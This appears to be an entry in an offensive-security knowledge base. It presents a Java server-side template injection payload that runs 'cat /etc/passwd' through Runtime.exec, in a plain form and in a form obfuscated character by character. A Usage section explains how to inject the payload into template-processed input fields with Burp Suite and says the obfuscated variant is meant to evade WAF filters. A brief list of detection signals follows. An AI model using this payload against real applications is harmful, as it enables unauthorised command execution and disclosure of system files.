---
id: d3e3c635-228c-4506-a3ed-343da4274f4f
type: code
language: Java
verified: true
created_at: '2023-04-06T03:56:39.352997+00:00'
updated_at: '2023-04-10T20:23:40.088725+00:00'
tags:
  - ssti
  - java
  - payload
  - file-read
platforms:
  - Linux
  - Web
validated: true
---

# Java-SSTI-Payload-for-Reading-Etc-Passwd

## Code

```java
${T(java.lang.Runtime).getRuntime().exec('cat etc/passwd')}

${T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec(T(java.lang.Character).toString(99).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(32)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(101)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(99)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(112)).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(119)).concat(T(java.lang.Character).toString(100))).getInputStream())}
```

## Description

This Java Server-Side Template Injection (SSTI) payload exploits vulnerable template engines in Java web applications to execute system commands and retrieve the /etc/passwd file. The first part uses Runtime.exec() directly to run 'cat etc/passwd' (note: original has 'etc/passwd' without slash, but context implies /etc/passwd). The second part obfuscates the command 'cat /etc/passwd' by constructing it character-by-character with Character.toString() and concat(), then captures the output using IOUtils.toString() on the process input stream. This allows the file contents to be rendered in the application's response.

## Parameters

| Variable | Description | Example |
|----------|-------------|---------|
| None | This payload has no substitutable variables; it is self-contained for direct injection. Adjust the command (e.g., 'cat /etc/passwd') based on target OS if needed. | N/A |

## Usage

Inject this payload into a user-controlled input field processed by a Java template engine (e.g., JSP, Freemarker, Velocity). Common vectors include search forms, user profiles, or dynamic content parameters. Use tools like Burp Suite to intercept and modify requests. The obfuscated variant helps bypass WAFs or filters detecting direct strings like 'cat /etc/passwd'. Once injected, submit the request and check the response for /etc/passwd contents. This code is referenced in procedures involving SSTI exploitation for file disclosure.

## Detection

- Monitor application logs for template rendering errors or unusual Java class resolutions (e.g., T(java.lang.Runtime)).
- WAF signatures for SSTI patterns like ${T(...)} or concat() chains in inputs.
- File access logs showing reads of /etc/passwd by the web server process.
- Anomalous network responses containing user account data or shell listings.

## Related

- [[procedures/Java-Server-Side-Template-Injection-to-Retrieve-Etc-Passwd]]
